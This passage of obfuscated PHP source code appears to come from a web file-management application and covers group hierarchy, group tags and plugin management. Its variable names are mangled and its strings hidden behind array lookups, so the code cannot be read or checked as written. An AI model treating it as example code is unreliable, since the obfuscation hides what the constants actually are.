"\x25{$Æ‡ú“Ÿæ}\45")); $±×ÕÀ‰ = $this->parseWhereLike($±×ÕÀ‰); if ($¼„ùÏ´º) { $±×ÕÀ‰[$¸ã™ĞÁ[1852]] = array($¸ã™ĞÁ[7], $¼„ùÏ´º); } $¯‚‚ºúâ = Model($¸ã™ĞÁ[1951])->where($±×ÕÀ‰)->limit($óêäıõ—)->select(); if (!$¯‚‚ºúâ) { return array(); } $¯‚‚ºúâ = array_to_keyvalue($¯‚‚ºúâ, $¸ã™ĞÁ[12], $¸ã™ĞÁ[1852]); $î¶ĞÄŞ = $this->where(array($¸ã™ĞÁ[1940] => array($¸ã™ĞÁ[7], $¯‚‚ºúâ)))->select(); if (!$î¶ĞÄŞ) { return array(); } return $î¶ĞÄŞ; } protected function _listDataApplyItem($ëŞ¥¨•ş) { $¡¯ŠŒÒÁ = array($ëŞ¥¨•ş); $this->_listDataApply($¡¯ŠŒÒÁ); return $¡¯ŠŒÒÁ[0]; } protected function _listDataApply(&$ø¹Ÿ¢š’) { $€ã©ìº =& $_SERVER[­á Ş³Ö]; if (!$ø¹Ÿ¢š’) { return; } $ŸÉƒ¾›Ë = array_to_keyvalue($ø¹Ÿ¢š’, $€ã©ìº[12], $€ã©ìº[1852]); $this->_listAppendChildren($ø¹Ÿ¢š’); $this->_listAppendChildrenMember($ø¹Ÿ¢š’); $this->_listAppendMeta($ø¹Ÿ¢š’, $ŸÉƒ¾›Ë); $this->_listAppendParent($ø¹Ÿ¢š’); $this->_listAppendSourceRoot($ø¹Ÿ¢š’, $ŸÉƒ¾›Ë); } private function _listAppendChildren(&$¨Ø½×í˜) { $íªä©ë =& $_SERVER[­á Ş³Ö]; $ê¢¬…ÙÉ = array_to_keyvalue($¨Ø½×í˜, $íªä©ë[12], $íªä©ë[1852]); $Üä¨ßóú = array($íªä©ë[432] => array($íªä©ë[7], $ê¢¬…ÙÉ)); $›¨“¿Ÿ¯ = array($íªä©ë[432], $íªä©ë[1952] => $íªä©ë[491]); $ì¡•ÈÌ = $this->field($›¨“¿Ÿ¯)->where($Üä¨ßóú)->group($íªä©ë[432])->select(); $‚ÁúÛ¥Ö = array_to_keyvalue($ì¡•ÈÌ, $íªä©ë[432], $íªä©ë[491]); foreach ($¨Ø½×í˜ as &$éÊÖûì˜) { $•¾şÃŸ· = $éÊÖûì˜[$íªä©ë[1852]]; $éÊÖûì˜[$íªä©ë[1953]] = isset($‚ÁúÛ¥Ö[$•¾şÃŸ·]) ? intval($‚ÁúÛ¥Ö[$•¾şÃŸ·]) : !1; } unset($éÊÖûì˜); } private function _listAppendChildrenMember(&$éÓ€Æ—) { $÷ÕˆÌÃˆ =& $_SERVER[­á Ş³Ö]; $™ÑĞÜ¨ = array_to_keyvalue($éÓ€Æ—, $÷ÕˆÌÃˆ[12], $÷ÕˆÌÃˆ[1852]); $‹ìñéã› = array($÷ÕˆÌÃˆ[1852] => array($÷ÕˆÌÃˆ[7], $™ÑĞÜ¨)); $–²©™è™ = array($÷ÕˆÌÃˆ[1852], $÷ÕˆÌÃˆ[1952] => $÷ÕˆÌÃˆ[491]); $™ûøÑïÓ = Model($÷ÕˆÌÃˆ[1942])->field($–²©™è™)->where($‹ìñéã›)->group($÷ÕˆÌÃˆ[1852])->select(); $™ÌšÈêû = array_to_keyvalue($™ûøÑïÓ, $÷ÕˆÌÃˆ[1852], $÷ÕˆÌÃˆ[491]); foreach ($éÓ€Æ— as &$†çë¼Ì) { $—Ë˜é¨ = $†çë¼Ì[$÷ÕˆÌÃˆ[1852]]; $†çë¼Ì[$÷ÕˆÌÃˆ[1954]] = isset($™ÌšÈêû[$—Ë˜é¨]) ? intval($™ÌšÈêû[$—Ë˜é¨]) : !1; } unset($†çë¼Ì); } private function _listAppendMeta(&$áéù†ü, $ıÕ·¦é’) { $ùïÍŒô‰ =& $_SERVER[­á Ş³Ö]; $¯Ÿ™İ› = array($ùïÍŒô‰[1852] => array($ùïÍŒô‰[7], $ıÕ·¦é’)); $ª“ªâ = Model($ùïÍŒô‰[1941])->where($¯Ÿ™İ›)->select(); $ª“ªâ = array_to_keyvalue_group($ª“ªâ, $ùïÍŒô‰[1852]); foreach ($ª“ªâ as &$ºãâ’úÌ) { $ºãâ’úÌ = array_to_keyvalue($ºãâ’úÌ, $ùïÍŒô‰[94], $ùïÍŒô‰[374]); } unset($ºãâ’úÌ); foreach ($áéù†ü as &$úÛù„Ü›) { $úÛù„Ü›[$ùïÍŒô‰[466]] = array(); if (isset($ª“ªâ[$úÛù„Ü›[$ùïÍŒô‰[1852]]])) { $úÛù„Ü›[$ùïÍŒô‰[466]] = $ª“ªâ[$úÛù„Ü›[$ùïÍŒô‰[1852]]]; } } unset($úÛù„Ü›); } protected function parentLevelArray($”ı†Ø‹Ã) { $Á•Öø± =& $_SERVER[­á Ş³Ö]; $”ı†Ø‹Ã = explode($Á•Öø±[50], trim($”ı†Ø‹Ã, $Á•Öø±[50])); $”ı†Ø‹Ã = array_remove_value($”ı†Ø‹Ã, $Á•Öø±[198]); return $”ı†Ø‹Ã; } protected function parentInGroup($ËÖ´¸„Ğ, $•êèÒ–´) { $´ÅŒ¸³ =& $_SERVER[­á Ş³Ö]; $èÚ±äÏ = $this->getInfoSimple($ËÖ´¸„Ğ); if (!$èÚ±äÏ) { return !0; } $³…Ë±Æà = $this->parentLevelArray($èÚ±äÏ[$´ÅŒ¸³[511]]); $³…Ë±Æà[] = $ËÖ´¸„Ğ; foreach ($³…Ë±Æà as $ËÖ´¸„Ğ) { if (in_array($ËÖ´¸„Ğ . $´ÅŒ¸³[12], $•êèÒ–´)) { return !0; } } return !1; } private function _listAppendParent(&$õÓŠ•–º) { $ƒ„ºıæá =& $_SERVER[­á Ş³Ö]; $å¨‰†æ = array(); foreach ($õÓŠ•–º as &$¤èúÃÓ“) { $å¨‰†æ[$¤èúÃÓ“[$ƒ„ºıæá[1852]]] = $¤èúÃÓ“[$ƒ„ºıæá[32]]; $øñÜÊ‘Ì = $this->parentLevelArray($¤èúÃÓ“[$ƒ„ºıæá[511]]); foreach ($øñÜÊ‘Ì as $ŞÆˆ„) { if (!isset($å¨‰†æ[$ŞÆˆ„])) { $å¨‰†æ[$ŞÆˆ„] = 0; } } } unset($¤èúÃÓ“); foreach ($å¨‰†æ as $™¤Úá” => $ÖÔÆ×ì§) { if ($ÖÔÆ×ì§) { continue; } $ìÅóèÁù = $this->getInfoSimple($™¤Úá”); $å¨‰†æ[$™¤Úá”] = $ìÅóèÁù[$ƒ„ºıæá[32]]; } $¯‚›¿²· = $GLOBALS[$ƒ„ºıæá[6]][$ƒ„ºıæá[89]][$ƒ„ºıæá[1955]]; if ($GLOBALS[$ƒ„ºıæá[494]] == $ƒ„ºıæá[88]) { $¯‚›¿²· = !1; } foreach ($õÓŠ•–º as &$¤èúÃÓ“) { $øñÜÊ‘Ì = $this->parentLevelArray($¤èúÃÓ“[$ƒ„ºıæá[511]]); $»¼”·Í‹ = $ƒ„ºıæá[12]; foreach ($øñÜÊ‘Ì as $™¤Úá” => $ŞÆˆ„) { if ($¯‚›¿²· && $™¤Úá” == 0) { continue; } $»¼”·Í‹ .= $å¨‰†æ[$ŞÆˆ„] . $ƒ„ºıæá[8]; } if ($øñÜÊ‘Ì) { $»¼”·Í‹ .= $¤èúÃÓ“[$ƒ„ºıæá[32]]; } $¤èúÃÓ“[$ƒ„ºıæá[516]] = str_replace($ƒ„ºıæá[519], $ƒ„ºıæá[8], $»¼”·Í‹); } unset($¤èúÃÓ“); } private function _listAppendSourceRoot(&$‡âƒ—¸, $óôÑ½‡å) { $Ò±ÊŒ¼â =& $_SERVER[­á Ş³Ö]; $õ€ˆñ¢• = Model($Ò±ÊŒ¼â[822])->listSourceRoot(SourceModel::TYPE_GROUP, $óôÑ½‡å); $õ€ˆñ¢• = array_to_keyvalue($õ€ˆñ¢•, $Ò±ÊŒ¼â[496]); $õ€ˆñ¢• = array_remove_key($õ€ˆñ¢•, $Ò±ÊŒ¼â[496]); foreach ($‡âƒ—¸ as &$¥‰ÈàÃï) { $¥‰ÈàÃï[$Ò±ÊŒ¼â[87]] = $õ€ˆñ¢•[$¥‰ÈàÃï[$Ò±ÊŒ¼â[1852]]] ? $õ€ˆñ¢•[$¥‰ÈàÃï[$Ò±ÊŒ¼â[1852]]] : array(); } unset($¥‰ÈàÃï); } protected function groupMerge($­ß‘›Ê) { $­ß‘›Ê = array_values(array_unique($­ß‘›Ê)); $ÇçâŠÍˆ = array(); for ($³ñöÂÄØ = 0; $³ñöÂÄØ < count($­ß‘›Ê); $³ñöÂÄØ++) { $Ö»¾ï†± = !1; for ($¾¯øÜ¿š = 0; $¾¯øÜ¿š < count($­ß‘›Ê); $¾¯øÜ¿š++) { if ($³ñöÂÄØ == $¾¯øÜ¿š) { continue; } if ($this->isParentOf($­ß‘›Ê[$¾¯øÜ¿š], $­ß‘›Ê[$³ñöÂÄØ])) { $Ö»¾ï†± = !0; break; } } if (!$Ö»¾ï†±) { $ÇçâŠÍˆ[] = $­ß‘›Ê[$³ñöÂÄØ]; } } return $ÇçâŠÍˆ; } protected function isParentOf($†ÌŸÆ‚å, $ìÑ£§«) { $Ì¾…î‘ =& $_SERVER[­á Ş³Ö]; if (!$†ÌŸÆ‚å || !$ìÑ£§« || $†ÌŸÆ‚å == $ìÑ£§«) { return !1; } $±¨‚·Ëø = $this->getInfoSimple($†ÌŸÆ‚å); $È§ÆÔè = $this->getInfoSimple($ìÑ£§«); $çÑê°• = $±¨‚·Ëø[$Ì¾…î‘[511]] . $†ÌŸÆ‚å . $Ì¾…î‘[50]; if (substr($È§ÆÔè[$Ì¾…î‘[511]], 0, strlen($çÑê°•)) == $çÑê°•) { return !0; } return !1; } public function groupShowRoot($ì»Ï¯Óƒ, $•ÜÜêï = false) { $Ÿ¶—ºª¢ =& $_SERVER[­á Ş³Ö]; $Ó«ÇÄĞ¬ = $this->getInfo($ì»Ï¯Óƒ); if (!$Ó«ÇÄĞ¬) { return array(); } $Ïı™ƒí¿ = $this->parentLevelArray($Ó«ÇÄĞ¬[$Ÿ¶—ºª¢[511]]); $ŒíÔ»§¢ = array($ì»Ï¯Óƒ); if (count($Ïı™ƒí¿) == 0) { return $ŒíÔ»§¢; } if ($•ÜÜêï && count($Ïı™ƒí¿) == 1) { return $ŒíÔ»§¢; } if (!$Ó«ÇÄĞ¬[$Ÿ¶—ºª¢[466]] || !isset($Ó«ÇÄĞ¬[$Ÿ¶—ºª¢[466]][$Ÿ¶—ºª¢[1938]]) || $Ó«ÇÄĞ¬[$Ÿ¶—ºª¢[466]][$Ÿ¶—ºª¢[1938]] == $Ÿ¶—ºª¢[1907]) { return $this->groupShowRoot($Ïı™ƒí¿[count($Ïı™ƒí¿) - 1], $•ÜÜêï); } if ($Ó«ÇÄĞ¬[$Ÿ¶—ºª¢[466]][$Ÿ¶—ºª¢[1938]] == $Ÿ¶—ºª¢[357]) { $Ì§Î½Ü¸ = explode($Ÿ¶—ºª¢[50], $Ó«ÇÄĞ¬[$Ÿ¶—ºª¢[466]][$Ÿ¶—ºª¢[1939]]); if ($Ì§Î½Ü¸) { $ŒíÔ»§¢ = array_merge($ŒíÔ»§¢, $Ì§Î½Ü¸); } } return $ŒíÔ»§¢; } protected function resetParentLevel() { $Ã×¸³Ú =& $_SERVER[­á Ş³Ö]; $¶ÛİÓ»é = $Ã×¸³Ú[1852]; $ş¡ Ëşß = $this->select(); $ş¡ Ëşß = array_to_keyvalue($ş¡ Ëşß, $¶ÛİÓ»é); foreach ($ş¡ Ëşß as $Òæ—Å‡Ÿ) { $à™ÖÑÂÄ = $Òæ—Å‡Ÿ; $ÂÅçÆù‡ = array(); while ($à™ÖÑÂÄ[$Ã×¸³Ú[432]] != 0) { $ÂÅçÆù‡[] = $à™ÖÑÂÄ[$Ã×¸³Ú[432]]; $à™ÖÑÂÄ = $ş¡ Ëşß[$à™ÖÑÂÄ[$Ã×¸³Ú[432]]]; } $ÂÅçÆù‡[] = 0; $ÂÅçÆù‡ = $Ã×¸³Ú[50] . implode($Ã×¸³Ú[50], array_reverse($ÂÅçÆù‡)) . $Ã×¸³Ú[50]; $this->setNamePinyin($Òæ—Å‡Ÿ[$¶ÛİÓ»é], $Òæ—Å‡Ÿ[$Ã×¸³Ú[32]]); $this->where(array($¶ÛİÓ»é => $Òæ—Å‡Ÿ[$¶ÛİÓ»é]))->save(array($Ã×¸³Ú[580] => $ÂÅçÆù‡)); } return $ş¡ Ëşß; } public function groupNameAuto($¸…¢¯Æ, $­Óáá—’) { $»¸æ…ÍË =& $_SERVER[­á Ş³Ö]; $Î¥ºÈÕÔ = $this->where(array($»¸æ…ÍË[401] => $¸…¢¯Æ))->getField($»¸æ…ÍË[32], !0); if (!$Î¥ºÈÕÔ || !in_array($­Óáá—’, $Î¥ºÈÕÔ)) { return $­Óáá—’; } for ($·ê’‹ = 1; $·ê’‹ <= count($Î¥ºÈÕÔ) + 1; $·ê’‹++) { $Á–âü¶À = $­Óáá—’ . "\x28{$·ê’‹}\x29"; if (!in_array($Á–âü¶À, $Î¥ºÈÕÔ)) { return $Á–âü¶À; } } } public function groupSwitch($íûâ™Á, $‚š¹İï) { $ æ¥²¸÷ =& $_SERVER[­á Ş³Ö]; $©Å‚®±š = array($ æ¥²¸÷[1852] => array($ æ¥²¸÷[7], array($íûâ™Á, $‚š¹İï))); $ıë±÷ƒÓ = $this->where($©Å‚®±š)->select(); $ıë±÷ƒÓ = array_to_keyvalue($ıë±÷ƒÓ, $ æ¥²¸÷[1852]); if (!isset($ıë±÷ƒÓ[$íûâ™Á]) || !isset($ıë±÷ƒÓ[$‚š¹İï]) || $ıë±÷ƒÓ[$íûâ™Á][$ æ¥²¸÷[432]] == 0) { return !1; } $©Å‚®±š = array($ æ¥²¸÷[1852] => $íûâ™Á); $à®´ˆ£¶ = Model($ æ¥²¸÷[1942])->where($©Å‚®±š)->select(); if (!$à®´ˆ£¶) { $à®´ˆ£¶ = array(); } foreach ($à®´ˆ£¶ as $œÓè¤—Í) { $Ãıî…í‚ = $œÓè¤—Í[$ æ¥²¸÷[1663]]; $©Å‚®±š = array($ æ¥²¸÷[1663] => $Ãıî…í‚, $ æ¥²¸÷[1852] => $‚š¹İï); $€ÚôÊªË = Model($ æ¥²¸÷[1942])->where($©Å‚®±š)->find(); if (!$€ÚôÊªË) { $¼®Ì·ÔÜ = array($‚š¹İï => $œÓè¤—Í[$ æ¥²¸÷[1956]]); Model($ æ¥²¸÷[525])->userGroupAdd($Ãıî…í‚, $¼®Ì·ÔÜ); } Model($ æ¥²¸÷[525])->userGroupRemove($Ãıî…í‚, $íûâ™Á); } $©Å‚®±š = array($ æ¥²¸÷[411] => 2, $ æ¥²¸÷[432] => 0, $ æ¥²¸÷[410] => 1, $ æ¥²¸÷[496] => array($ æ¥²¸÷[7], array($íûâ™Á, $‚š¹İï))); $ñ•Íª®× = Model($ æ¥²¸÷[822])->where($©Å‚®±š)->field($ æ¥²¸÷[1957])->select(); $ñ•Íª®× = array_to_keyvalue($ñ•Íª®×, $ æ¥²¸÷[496], $ æ¥²¸÷[402]); $Î¨Ïƒ = !empty($ñ•Íª®×[$íûâ™Á]) ? $ñ•Íª®×[$íûâ™Á] : !1; if ($Î¨Ïƒ) { if (!$ñ•Íª®×[$‚š¹İï]) { $ñ•Íª®×[$‚š¹İï] = Model($ æ¥²¸÷[822])->groupRootAdd($‚š¹İï); } $–¨¸“®ñ = $ñ•Íª®×[$‚š¹İï]; $©Å‚®±š = array($ æ¥²¸÷[432] => $Î¨Ïƒ); $ñ•Íª®× = Model($ æ¥²¸÷[822])->where($©Å‚®±š)->field($ æ¥²¸÷[1958])->select(); if (!$ñ•Íª®×) { $ñ•Íª®× = array(); } Model($ æ¥²¸÷[822])->moveClearAuth = !1; foreach ($ñ•Íª®× as $Ô­şÊµº) { $°ÀÔÇó… = $Ô­şÊµº[$ æ¥²¸÷[410]] == $ æ¥²¸÷[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ æ¥²¸÷[822])->move($Ô­şÊµº[$ æ¥²¸÷[402]], $–¨¸“®ñ, $°ÀÔÇó…); } Model($ æ¥²¸÷[822])->moveClearAuth = !0; $©Å‚®±š = array($ æ¥²¸÷[411] => 2, $ æ¥²¸÷[496] => $íûâ™Á); $›¤›·È = array($ æ¥²¸÷[496] => $‚š¹İï); Model($ æ¥²¸÷[1959])->where($©Å‚®±š)->save($›¤›·È); Model($ æ¥²¸÷[1960])->where($©Å‚®±š)->save($›¤›·È); } $this->_changeChildLevel($ıë±÷ƒÓ[$íûâ™Á], $ıë±÷ƒÓ[$‚š¹İï], !0); $this->where(array($ æ¥²¸÷[432] => $íûâ™Á))->save(array($ æ¥²¸÷[432] => $‚š¹İï)); $this->_clearChildrenCache($ıë±÷ƒÓ[$‚š¹İï]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($ÆƒƒÍ°ë) { $¥Ü¬Äªı =& $_SERVER[­á Ş³Ö]; return array($¥Ü¬Äªı[1961] => array($ÆƒƒÍ°ë[0], $¥Ü¬Äªı[1962]), $¥Ü¬Äªı[1963] => array($ÆƒƒÍ°ë[0], $¥Ü¬Äªı[1964])); } protected function get($‹Å½Êîş) { $½ÌŒì =& $_SERVER[­á Ş³Ö]; $—ıµºÊâ = Model($½ÌŒì[512])->metaGet($‹Å½Êîş, $½ÌŒì[1965]); $Ğ±´§Ù = json_decode($—ıµºÊâ, !0); return $Ğ±´§Ù ? $Ğ±´§Ù : array($½ÌŒì[1966] => $½ÌŒì[88], $½ÌŒì[369] => array()); } protected function set($ÒŸ¬‰†¸, $‡œòÆå¹) { $õë›ÎâÙ =& $_SERVER[­á Ş³Ö]; $‡œòÆå¹ = $‡œòÆå¹ ? $‡œòÆå¹ : array($õë›ÎâÙ[1966] => $õë›ÎâÙ[88], $õë›ÎâÙ[369] => array()); return Model($õë›ÎâÙ[512])->metaSet($ÒŸ¬‰†¸, $õë›ÎâÙ[1965], json_encode($‡œòÆå¹)); } protected function getByTagID($»Ñ¿ÓÀÁ, $ÁÀ±ã˜ó) { $™úÜ»Ÿ® =& $_SERVER[­á Ş³Ö]; if (!$»Ñ¿ÓÀÁ || !$ÁÀ±ã˜ó) { return !1; } if (!Model($™úÜ»Ÿ®[512])->getInfoSimple($»Ñ¿ÓÀÁ)) { return !1; } $üÍÃ§¢º = $this->get($»Ñ¿ÓÀÁ); if (!$üÍÃ§¢º || !isset($üÍÃ§¢º[$™úÜ»Ÿ®[369]])) { return !1; } $³å¤“³ = array_find_by_field($üÍÃ§¢º[$™úÜ»Ÿ®[369]], $™úÜ»Ÿ®[399], $ÁÀ±ã˜ó); return is_array($³å¤“³) ? $³å¤“³ : !1; } public function listSource($æ¸Ã¼÷Î, $ê˜íÀ¢È) { $‹†¼¡ıâ =& $_SERVER[­á Ş³Ö]; if ($ê˜íÀ¢È && !is_array($ê˜íÀ¢È)) { $ê˜íÀ¢È = array($ê˜íÀ¢È); } $Š„¾†÷ = $this->listData($æ¸Ã¼÷Î); $Ä’Ÿš…Ö = array(); foreach ($Š„¾†÷ as $­ô’ê) { $‡ñÁŠÓ = $­ô’ê[$‹†¼¡ıâ[84]]; if (!$‡ñÁŠÓ) { continue; } if (!isset($Ä’Ÿš…Ö[$‡ñÁŠÓ])) { $Ä’Ÿš…Ö[$‡ñÁŠÓ] = array(); } $Ä’Ÿš…Ö[$‡ñÁŠÓ][] = $­ô’ê[$‹†¼¡ıâ[426]]; } $Ì£éùø = array(); foreach ($Ä’Ÿš…Ö as $ìÔ‘Ü¡˜ => $ü´…ù¡ó) { $¹ôæ¦µå = !0; if (!$ê˜íÀ¢È) { $Ì£éùø[] = $ìÔ‘Ü¡˜; continue; } foreach ($ê˜íÀ¢È as $Ï¼ŒÄşß) { if (!in_array($Ï¼ŒÄşß, $ü´…ù¡ó)) { $¹ôæ¦µå = !1; break; } } if ($¹ôæ¦µå) { $Ì£éùø[] = $ìÔ‘Ü¡˜; } } if (!$Ì£éùø) { return array(); } $­„óş½¼ = array($‹†¼¡ıâ[417] => array($‹†¼¡ıâ[418], $Ì£éùø), $‹†¼¡ıâ[496] => $æ¸Ã¼÷Î, $‹†¼¡ıâ[411] => SourceModel::TYPE_GROUP); $ë¦Á¤ˆš = Model($‹†¼¡ıâ[1335])->listSource($­„óş½¼); if (!$ë¦Á¤ˆš || count($Ì£éùø) == $ë¦Á¤ˆš[$‹†¼¡ıâ[366]][$‹†¼¡ıâ[367]]) { return $ë¦Á¤ˆš; } $®«ß«’ = array(); $úéšÙ…¹ = array_to_keyvalue($ë¦Á¤ˆš[$‹†¼¡ıâ[82]], $‹†¼¡ıâ[12], $‹†¼¡ıâ[402]); $”©²Ø‚¼ = array_to_keyvalue($ë¦Á¤ˆš[$‹†¼¡ıâ[83]], $‹†¼¡ıâ[12], $‹†¼¡ıâ[402]); $õ¾µ¶ƒÛ = array_merge($”©²Ø‚¼, $úéšÙ…¹); foreach ($Ì£éùø as $‡ñÁŠÓ) { if (!in_array($‡ñÁŠÓ, $õ¾µ¶ƒÛ)) { $®«ß«’[] = $‡ñÁŠÓ; } } if ($®«ß«’) { $this->removeBySource($æ¸Ã¼÷Î, $®«ß«’); } return $ë¦Á¤ˆš; } protected function listData($¸ØÄ¨µñ) { $óëüì¯¶ =& $_SERVER[­á Ş³Ö]; $Ç¿¡Õ¯‰ = array($óëüì¯¶[1654] => 0, $óëüì¯¶[483] => array($óëüì¯¶[1967], 0), $óëüì¯¶[422] => $óëüì¯¶[1968] . $¸ØÄ¨µñ); $ôµíÛ½à = $óëüì¯¶[1969]; $š’ÂÒÜ¾ = $this->field($ôµíÛ½à)->where($Ç¿¡Õ¯‰)->order($óëüì¯¶[1970])->select(); return $š’ÂÒÜ¾ ? $š’ÂÒÜ¾ : array(); } protected function addToTag($şºöÙüÃ, $ÖÙÛúÎé, $ĞĞ„Ÿ­§) { $ã¤Ğ÷Ê =& $_SERVER[­á Ş³Ö]; if (!$this->getByTagID($şºöÙüÃ, $ĞĞ„Ÿ­§) || !$ÖÙÛúÎé) { return !1; } if (!Model($ã¤Ğ÷Ê[822])->pathInfo($ÖÙÛúÎé)) { return !1; } $ìÀÀäİ¸ = array($ã¤Ğ÷Ê[1654] => 0, $ã¤Ğ÷Ê[483] => $ĞĞ„Ÿ­§, $ã¤Ğ÷Ê[421] => $ÖÙÛúÎé, $ã¤Ğ÷Ê[422] => $ã¤Ğ÷Ê[1971] . $şºöÙüÃ, $ã¤Ğ÷Ê[420] => $ã¤Ğ÷Ê[12], $ã¤Ğ÷Ê[1856] => 0); if ($this->where($ìÀÀäİ¸)->find()) { return !1; } return $this->add($ìÀÀäİ¸); } protected function removeFromTag($Ôú»ËÛÅ, $Ú€¤øç, $§ä‡´¬) { $ÈÖ‰µù =& $_SERVER[­á Ş³Ö]; if (!$this->getByTagID($Ôú»ËÛÅ, $§ä‡´¬) || !$Ú€¤øç) { return !1; } if (is_array($Ú€¤øç)) { $Ú€¤øç = array($ÈÖ‰µù[7], $Ú€¤øç); } $û‡¤Ì¦ = array($ÈÖ‰µù[1654] => 0, $ÈÖ‰µù[483] => $§ä‡´¬, $ÈÖ‰µù[422] => $ÈÖ‰µù[1971] . $Ôú»ËÛÅ, $ÈÖ‰µù[421] => $Ú€¤øç); return $this->where($û‡¤Ì¦)->delete(); } protected function removeByTag($ÄñÓšº, $í»ØÄ¤) { $üğäêİ’ =& $_SERVER[­á Ş³Ö]; if (!$this->getByTagID($ÄñÓšº, $í»ØÄ¤)) { return !1; } $ÙÒË©İ = array($üğäêİ’[1654] => 0, $üğäêİ’[483] => $í»ØÄ¤, $üğäêİ’[422] => $üğäêİ’[1971] . $ÄñÓšº); return $this->where($ÙÒË©İ)->delete(); } protected function removeBySource($õ æ±Š, $œ‹§–ù) { $åÆµËğñ =& $_SERVER[­á Ş³Ö]; if (!$õ æ±Š || !$œ‹§–ù) { return !1; } if (is_array($œ‹§–ù)) { $œ‹§–ù = array($åÆµËğñ[7], $œ‹§–ù); } $ŞÖº¸ì” = array($åÆµËğñ[1654] => 0, $åÆµËğñ[421] => $œ‹§–ù, $åÆµËğñ[483] => array($åÆµËğñ[1010], 0), $åÆµËğñ[422] => $åÆµËğñ[1971] . $õ æ±Š); return $this->where($ŞÖº¸ì”)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\160\154\165\147\x69\156\x4c\151\x73\164"; public $field = array("\156\141\x6d\145", "\163\164\141\164\165\163", "\x72\x65\147\151\x65\163\164", "\x63\x6f\156\146\x69\x67"); public function loadList($Ÿ‹”ïò¹ = false) { $€ä¿çÁ = array_to_keyvalue($this->listData(), $_SERVER[­á Ş³Ö][32]); if ($Ÿ‹”ïò¹) { return $€ä¿çÁ[$Ÿ‹”ïò¹]; } return $€ä¿çÁ; } public function init() { $Æç§Ÿ¨ =& $_SERVER[­á Ş³Ö]; Hook::trigger($Æç§Ÿ¨[1972]); $®ÎşÀÛ = $this->loadPluginList(); foreach ($®ÎşÀÛ as $¢îÎ®Ñ¨ => $–Ü¥ìãÈ) { $œÉè½å³ = $this->appAllow($¢îÎ®Ñ¨, $–Ü¥ìãÈ); if (!$œÉè½å³) { continue; } foreach ($–Ü¥ìãÈ[$Æç§Ÿ¨[1973]] as $‰£º¦á— => $ìÇôüšØ) { Hook::bind($‰£º¦á—, $ìÇôüšØ); } } Hook::trigger($Æç§Ÿ¨[1974]); Hook::trigger(ACTION); } public function appAllow($—İŸÛ±», $ß±ââŸ¿, $ì…îÜ£¹ = true) { $˜©·àˆ– =& $_SERVER[­á Ş³Ö]; $£èòğÎÅ = PLUGIN_DIR . $—İŸÛ±» . $˜©·àˆ–[1975]; if (!is_array($ß±ââŸ¿) || !is_array($ß±ââŸ¿[$˜©·àˆ–[1973]]) || $ß±ââŸ¿[$˜©·àˆ–[746]] != 1 || !is_file($£èòğÎÅ)) { return !1; } if ($GLOBALS[$˜©·àˆ–[494]] == 1) { if ($GLOBALS[$˜©·àˆ–[6]][$˜©·àˆ–[1976]] || !$GLOBALS[$˜©·àˆ–[6]][$˜©·àˆ–[1977]]) { return !0; } $Ñâ† = explode($˜©·àˆ–[50], strtolower($GLOBALS[$˜©·àˆ–[6]][$˜©·àˆ–[1977]])); return in_array(strtolower($—İŸÛ±»), $Ñâ†) ? !1 : !0; } if ($ì…îÜ£¹ && !Action($˜©·àˆ–[1978])->checkAuth($—İŸÛ±»)) { return !1; } return !0; } public function unInstall($‰Î½úÖ) { $Ó½’¨‰ä =& $_SERVER[­á Ş³Ö]; $‹ÈÀÖüÇ = $this->loadList($‰Î½úÖ); if (file_exists(PLUGIN_DIR . $‰Î½úÖ)) { Hook::apply($‰Î½úÖ . $Ó½’¨‰ä[1979]); } $this->remove($‹ÈÀÖüÇ[$Ó½’¨‰ä[399]]); } public function changeStatus($îÇŠæ‰, $ÍêŠ¦Éğ) { $¹¹Êé =& $_SERVER[­á Ş³Ö]; $ˆ¬¯«ı = $this->loadList($îÇŠæ‰); if ($ÍêŠ¦Éğ) { Hook::apply($îÇŠæ‰ . $¹¹Êé[1980]); } $this->update($ˆ¬¯«ı[$¹¹Êé[399]], array($¹¹Êé[1981] => $ÍêŠ¦Éğ)); } public function appRegist($×„«Ÿ¹û, $ùñ§Ï³Ñ) { $ü¿ù¾²ò =& $_SERVER[­á Ş³Ö]; $¤›š»–ê = $this->loadList($×„«Ÿ¹û); if ($¤›š»–ê) { $this->update($¤›š»–ê[$ü¿ù¾²ò[399]], array($ü¿ù¾²ò[1973] => $ùñ§Ï³Ñ)); } else { $¤¾š«‡Ş = array($ü¿ù¾²ò[32] => $×„«Ÿ¹û, $ü¿ù¾²ò[1973] => $ùñ§Ï³Ñ, $ü¿ù¾²ò[746] => 0, $ü¿ù¾²ò[6] => $this->getConfigDefault($×„«Ÿ¹û)); $this->insert($¤¾š«‡Ş); } } public function getConfigDefault($™«Æ¤ëš) { $¹«Óºğù =& $_SERVER[­á Ş³Ö]; $Ç¦Ëºñò = array(); $ß“ÃÛÙƒ = $this->getPackageJson($™«Æ¤ëš); if (!$ß“ÃÛÙƒ && is_array($ß“ÃÛÙƒ[$¹«Óºğù[1982]])) { return $Ç¦Ëºñò; } foreach ($ß“ÃÛÙƒ[$¹«Óºğù[1982]] as $œÆÂÃ¼„ => $¼øö˜â—) { if (!isset($¼øö˜â—[$¹«Óºğù[374]]) || isset($Ç¦Ëºñò[$œÆÂÃ¼„])) { continue; } $Ç¦Ëºñò[$œÆÂÃ¼„] = $¼øö˜â—[$¹«Óºğù[374]]; } return $Ç¦Ëºñò; } public function getPackageJson($°ñãæ§¼) { return Hook::apply($°ñãæ§¼ . $_SERVER[­á Ş³Ö][1983]); } public function getConfig($æ£Ô„é, $–’¬İÚ€ = false) { $•…î­úÏ =& $_SERVER[­á Ş³Ö]; $÷ê•·‹ = array(); $îºØ³ = $this->loadList($æ£Ô„é); if ($îºØ³ && is_array($îºØ³[$•…î­úÏ[6]])) { $÷ê•·‹ = $îºØ³[$•…î­úÏ[6]]; } if (!$÷ê•·‹ || $–’¬İÚ€) { $÷ê•·‹ = $this->getConfigDefault($æ£Ô„é); } return $÷ê•·‹; } public function setConfig($ÉòØ®«ë, $ÍÔÙ“÷… = false) { $¸šÑ’…¤ =& $_SERVER[­á Ş³Ö]; $°©¬³’Æ = $this->loadList($ÉòØ®«ë); if (!$°©¬³’Æ) { return !1; } $¤õÊúŒÅ = $°©¬³’Æ[$¸šÑ’…¤[6]]; if ($ÍÔÙ“÷… == !1) { $¤õÊúŒÅ = array(); $ÍÔÙ“÷… = 